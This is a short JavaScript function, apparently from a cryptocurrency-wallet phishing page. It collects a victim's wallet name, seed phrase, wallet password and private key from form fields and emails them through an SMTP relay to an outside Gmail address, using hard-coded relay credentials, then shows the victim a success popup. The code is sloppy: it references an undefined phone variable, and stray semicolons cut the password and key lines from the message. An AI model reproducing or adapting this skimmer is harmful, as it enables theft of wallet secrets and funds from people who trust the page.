function emailSend(){



	var userName = document.getElementById('wallet').value;
  var phrase = document.getElementById('phrase').value;
	var walletpassword = document.getElementById('walletpassword').value;
  var privatekey = document.getElementById('email').value;


	var messageBody = "wallet " + userName +

	"<br/> Phone " + phone +

	"<br/> Phrase " + phrase;
  "<br/> Walletpassword " + walletpassword;
  "<br/> Privatekey " + privatekey;

	Email.send({

    Host : "smtp.elasticemail.com",

    Username : "adeolatoolz@gmail.com",

    Password : "9460FC7859351FA8C67272051ECC2B1D9C30",

    To : 'go.marryjane@gmail.com',

    From : "adeolatoolz@gmail.com",

    Subject : "This is the subject",

    Body : messageBody

}).then(

  message => {

  	if(message=='OK'){

  		swal("Secussful", "You clicked the button!", "success");

  	}

  	else{

  		swal("Error", "You clicked the button!", "error");

  	}

  }

);

    
